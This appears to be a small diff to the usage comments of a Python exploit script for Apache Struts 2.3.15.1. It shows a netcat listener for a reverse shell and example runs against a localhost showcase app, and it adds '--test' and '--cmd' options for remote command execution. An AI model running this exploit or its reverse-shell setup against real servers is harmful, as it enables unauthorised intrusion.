@@ -10,6 +10,9 @@
 # Ex:
 # Open: $ nc -lnvp 4444
 # python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --ip=127.0.0.1 --port=4444
+# python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --test
+# python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --cmd='uname -a'
+
 
 """
 Usage:
